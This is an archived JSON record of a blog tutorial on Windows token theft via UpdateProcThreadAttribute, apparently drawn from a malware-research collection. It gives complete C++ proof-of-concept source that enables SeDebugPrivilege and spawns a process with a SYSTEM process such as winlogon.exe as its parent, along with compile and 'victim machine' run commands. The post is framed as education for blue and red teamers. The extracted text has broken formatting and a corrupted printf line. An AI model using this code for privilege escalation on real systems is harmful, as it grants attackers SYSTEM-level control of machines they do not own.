{
    "id": "f8b3b012-0e00-4470-88c1-535ef05506a4",
    "created_at": "2023-01-12T15:10:07.222024Z",
    "updated_at": "2025-03-27T02:05:53.573782Z",
    "deleted_at": null,
    "sha1_hash": "8c3301e7044632c8eae95fa8d8b69ae563935800",
    "title": "2022-10-28 - APT techniques- Token theft via UpdateProcThreadAttribute. Simple Cplusplus example.",
    "authors": "",
    "file_creation_date": "2022-11-28T19:02:45Z",
    "file_modification_date": "2022-11-28T19:02:45Z",
    "file_size": 1125567,
    "plain_text": "# APT techniques: Token theft via UpdateProcThreadAttribute. Simple C++ example.\n\n**[cocomelonc.github.io/tutorial/2022/10/28/token-theft-2.html](https://cocomelonc.github.io/tutorial/2022/10/28/token-theft-2.html)**\n\nOctober 28, 2022\n\n### 3 minute read\n\n ﷽\n\n Hello, cybersecurity enthusiasts and white hackers!\n\n This post is the result of my own research into one of the more interesting APT techniques: token theft via UpdateProcThreadAttribute.\n\n In the previous post I wrote about classic token theft via DuplicateTokenEx and\n```\nCreateProcessWithTokenW . Today I will describe an alternative method that works starting\n\n from Windows Vista.\n\n## UpdateProcThreadAttribute\n\n```\n\n-----\n\n### In the first part of my tutorial, we just doing classic trick: enable SE_DEBUG_PRIVILEGE, open a token from any system process (which works even for protected processes also), duplicate the token, adjust privileges on it, and then impersonate with this token.\n\n Today we can use more simply trick. Microsoft implemented in Vista the ability to designate an explicit parent process when creating a new process, allowing the elevated process to remain a child of the caller.\n\n Typically, in the UAC instance, you must issue an explicit token to the new process. If you do not supply a token, the new process will inherit from the designated parent. The only condition is that the handle to the parent process must have the PROCESS_CREATE_PROCESS access privilege.\n\n So, we just open some system process with PROCESS_CREATE_PROCESS access right. Then use this handle with UpdateProcThreadAttribute . In consequence, your process inherits a token from the system process.\n```\nBOOL UpdateProcThreadAttribute(\n\n LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,\n\n DWORD            dwFlags,\n\n DWORD_PTR          Attribute,\n\n PVOID            lpValue,\n\n SIZE_T            cbSize,\n\n PVOID            lpPreviousValue,\n\n PSIZE_T           lpReturnSize\n\n);\n\n And all you need for working this is SE_DEBUG_PRIVILEGE .\n\n## technique. practical example\n\n### First of all, sometimes you must turn on SeDebugPrivilege in your current set of privileges:\n\n```\n\n-----\n\n```\n// set privilege\n\nBOOL setPrivilege(LPCTSTR priv) {\n\n HANDLE token;\n\n TOKEN_PRIVILEGES tp;\n\n LUID luid;\n\n BOOL res = TRUE;\n\n tp.PrivilegeCount = 1;\n\n tp.Privileges[0].Luid = luid;\n\n tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n\n if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;\n\n if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token)) res =\nFALSE;\n\n if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES),\n(PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;\n\n printf(res ? \"successfully enable %s :)\\n\" : \"failed to enable %s :(\\n\", priv);\n\n return res;\n\n}\n\n### Then, open a process whose access token you wish to steal with\nPROCESS_CREATE_PROCESS access rights:\nHANDLE ph = OpenProcess(PROCESS_CREATE_PROCESS, false, pid);\n\n After that, use it is handle with UpdateProcThreadAttribute :\nZeroMemory(&si, sizeof(STARTUPINFOEXW));\n\nZeroMemory(&pi, sizeof(PROCESS_INFORMATION));\n\nInitializeProcThreadAttributeList(NULL, 1, 0, &size);\n\nsi.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(\n\n GetProcessHeap(),\n\n 0,\n\n size\n\n);\nInitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);\n\nUpdateProcThreadAttribute(si.lpAttributeList, 0,\nPROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ph, sizeof(HANDLE), NULL, NULL);\n\nsi.StartupInfo.cb = sizeof(STARTUPINFOEXW);\n\n Finally, create process:\nres = CreateProcessW(app, NULL, NULL, NULL, true, EXTENDED_STARTUPINFO_PRESENT |\nCREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);\n\nprintf(res ? \"successfully create process :)\\n\" : \"failed to create process :(\\n\");\n\n So, the full source code of this logic is look like this:\n\n```\n\n-----\n\n```\n/\nhack.cpp\n\ntoken theft via\n\nUpdateProcThreadAttribute\n\nauthor: @cocomelonc\n\nhttps://cocomelonc.github.io/malware/2022/10/28/token-theft-2.html\n\n*/\n#include <windows.h>\n\n#include <stdio.h>\n\n#include <iostream>\n\n// set privilege\n\nBOOL setPrivilege(LPCTSTR priv) {\n\n HANDLE token;\n\n TOKEN_PRIVILEGES tp;\n\n LUID luid;\n\n BOOL res = TRUE;\n\n tp.PrivilegeCount = 1;\n\n tp.Privileges[0].Luid = luid;\n\n tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n\n if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;\n\n if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token)) res =\nFALSE;\n\n if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES),\n(PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;\n\n printf(res ? \"successfully enable %s :)\\n\" : \"failed to enable %s :(\\n\", priv);\n\n return res;\n\n}\n\n// create process\n\nBOOL createProcess(DWORD pid, LPCWSTR app) {\n\n STARTUPINFOEXW si;\n\n PROCESS_INFORMATION pi;\n\n SIZE_T size;\n\n BOOL res = TRUE;\n\n HANDLE ph = OpenProcess(PROCESS_CREATE_PROCESS, false, pid);\n\n printf(ph ? \"successfully open process :)\\n\" : \"failed to open process :(\\n\");\n\n ZeroMemory(&si, sizeof(STARTUPINFOEXW));\n\n ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));\n\n InitializeProcThreadAttributeList(NULL, 1, 0, &size);\n\n si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0,\nsize);\n\n InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);\n\n UpdateProcThreadAttribute(si.lpAttributeList, 0,\nPROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &ph, sizeof(HANDLE), NULL, NULL);\n\n si.StartupInfo.cb = sizeof(STARTUPINFOEXW);\n\n res = CreateProcessW(app, NULL, NULL, NULL, true, EXTENDED_STARTUPINFO_PRESENT |\nCREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);\n\n```\n\n-----\n\n```\n printf(res ? successfully create process :)\\n : failed to create process :(\\n );\n\n return res;\n\n}\n\nint main(int argc, char** argv) {\n\n if (!setPrivilege(SE_DEBUG_NAME)) return -1;\n\n DWORD pid = atoi(argv[1]);\n\n if (!createProcess(pid, L\"C:\\\\Windows\\\\System32\\\\mspaint.exe\")) return -1;\n\n return 0;\n\n}\n\n### As you can see, the code is slightly different from the previous part. This code is just dirty PoC, for simplicity, I run mspaint.exe .\n\n## demo\n\n### Let’s go to see everything in action. Compile our PoC:\nx86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -I/usr/share/mingw-w64/include/ -s ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-allconstants -static-libstdc++ -static-libgcc -fpermissive\n\n Then, run it at the victim’s machine:\n.\\hack.exe <PID>\n\n```\n\n-----\n\n### As an example, you may steal the winlogon.exe (PID: 544) access token:\n\n\n-----\n\n-----\n\n-----\n\n### As you can see, everything is worked perfectly!\n\n I hope this post least a little useful for entry level cyber security specialists (and possibly even professionals), also spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal.\n\n Local Security Authority Privilege Constants LookupPrivilegeValue AdjustTokenPrivileges UpdateProcThreadAttribute CreateProcessW APT techniques: Token theft. Part 1 source code in github\n\n This is a practical case for educational purposes only.\n\n Thanks for your time happy hacking and good bye!\n PS. All drawings and screenshots are mine\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-10-28 - APT techniques- Token theft via UpdateProcThreadAttribute. Simple Cplusplus example..pdf"
    ],
    "report_names": [
        "2022-10-28 - APT techniques- Token theft via UpdateProcThreadAttribute. Simple Cplusplus example..pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536207,
    "ts_updated_at": 1743041153,
    "ts_creation_date": 1669662165,
    "ts_modification_date": 1669662165,
    "files": {
        "pdf": "https://archive.orkl.eu/8c3301e7044632c8eae95fa8d8b69ae563935800.pdf",
        "text": "https://archive.orkl.eu/8c3301e7044632c8eae95fa8d8b69ae563935800.txt",
        "img": "https://archive.orkl.eu/8c3301e7044632c8eae95fa8d8b69ae563935800.jpg"
    }
}